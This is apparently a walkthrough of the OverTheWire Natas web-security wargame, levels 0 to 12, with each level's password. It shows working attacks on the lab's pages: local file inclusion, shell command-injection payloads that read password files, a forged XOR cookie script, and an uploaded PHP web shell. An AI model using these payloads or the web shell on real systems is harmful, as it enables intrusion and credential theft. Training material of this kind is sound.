## Natas - the basics of serverside web-security vulnerabilities

### natas0

Step 1: F12 -> Inspector

```php
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

### natas1

Step 1: View page source (Ctrl + U)

```php
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```
### natas2

Step 1: View page source

```php
...
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
...
```

Step 2: Access to `files/pixel.png` -> Back to `files`

```php
...
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right">145 </td><td>&nbsp;</td></tr>
...
```

Step 3: Access to `users.txt`

```php
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

### natas3

Step 1: View page source

```php
...
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
...
```

Step 2: The `robots.txt` file on a webpage tells search engines which directories not to enter.
We try access to `robots.txt`

```php
User-agent: *
Disallow: /s3cr3t/
```

Step 3: Access to `/s3cr3t/`

```php
...
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
...
```

Step 4: Access to `users.txt`

```php
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

### natas4

```php
...
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
...
```

Step 1: F12 to inspect `Request Headers`

```html
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas5.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Step 2: Burp Repeater -> Change `Referer: http://natas5.natas.labs.overthewire.org/`

```html
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

### natas5

```html
Access disallowed. You are not logged in</div>
```

Step 1: inspect response

```html
HTTP/1.1 200 OK
Date: Fri, 04 Mar 2022 16:14:39 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Connection: close
Content-Type: text/html; charset=UTF-8
```

Step 2: Burp Repeater -> Add header `Cookie: loggedin=1`

```html
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

### natas6

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

We need find `$secret`, then post this value to form to pass the condition `$secret == $_POST['secret']`. The `$secret` variable wasn't declared in `index.php`, but `index.php` include `includes/secret.inc`.

Step 1: Access `includes/secret.inc`

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Step 2: Submit secret=FOEIUWGHFEEUHOFUOIU

```html
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

### natas7

This is LFI, we can change param `?page=/etc/natas_webpass/natas8`. This is leads `index.php` includes `/etc/natas_webpass/natas8` and show off password.

```html
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

### natas8

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

We can decode `$secret`, then post this value to form.

```php
echo hex2bin("3d3d516343746d4d6d6c315669563362");
// ==QcCtmMml1ViV3b
strrev("==QcCtmMml1ViV3b");
// b3ViV1lmMmtCcQ==
base64_decode("b3ViV1lmMmtCcQ==");
// oubWYf2kBq
```

```html
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

### natas9

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Because `$key` isn't validated, we can inject cli into `$key`. 
The payload is `'123' dictionary.txt; cat /etc/natas_webpass/natas10`

```html
Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

African
Africans
...
```

### natas10

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Some certain characters was filtered, but we can use another payload look like `'' /etc/natas_webpass/natas11`

```
Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
...
```

### natas11

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>
```

```php
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Step 1: inspect response, we can see cookie.

```
Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

The `cookie` value is set by `XOR($defaultdata, $key)`. If `"showpassword"=>"no"`, we don't see the password. So we need to change the `cookie` with `"showpassword"=>"yes"`.

Because we have `cookie` value and `$defaultdata`, we can compute `XOR($defaultdata, cookie)` to find `$key` (XOR property: A xor B = C => A xor C = B).

Finally, we compute `XOR($new_data, $key)`, note that we need to chage `$new_data` with `"showpassword"=>"yes"`.

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
echo json_encode($defaultdata);
// {"showpassword":"no","bgcolor":"#ffffff"}
echo base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
// b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
```

Step 2: We create `solve.py` (python3) to generate new cookie.

```python
import base64

data = '{"showpassword":"no","bgcolor":"#ffffff"}'
xoring = base64.b64decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=')

print('data:', data)
print('xoring:', xoring)

key = []
for i in range(len(xoring)):
    c = xoring[i] ^ ord(data[i])
    print('char of key:', c)
    if c not in key:
        key.append(c)

print('key:', key)

cookie = ''
data = '{"showpassword":"yes","bgcolor":"#ffffff"}'
for i in range(len(data)):
    cookie += chr(key[i % len(key)] ^ ord(data[i]))

print('cookie:', base64.b64encode(cookie.encode()))
```

```shell
data: {"showpassword":"no","bgcolor":"#ffffff"}
xoring: b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
key: [113, 119, 56, 74]
cookie: b'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```

Step 3: Burp Repeater -> Change `Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

```html
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
```

### natas12

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
```

This is Unrestricted File Upload from client-side. We can change `.jpg` to `.php` in `<input>` of html, then upload `shell.php` file to excute some tasks.

```php
<?php // shell.php
$data = system($_GET["cmd"]);
echo $data;
?>  
```

After upload file, we can see:

```php
Notice: Undefined index: cmd in /var/www/natas/natas12/upload/tb0heduy1x.php on line 2

Warning: system(): Cannot execute a blank command in /var/www/natas/natas12/upload/tb0heduy1x.php on line 2
```

Add param into url `?cmd=cat /etc/natas_webpass/natas13`.

```html
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```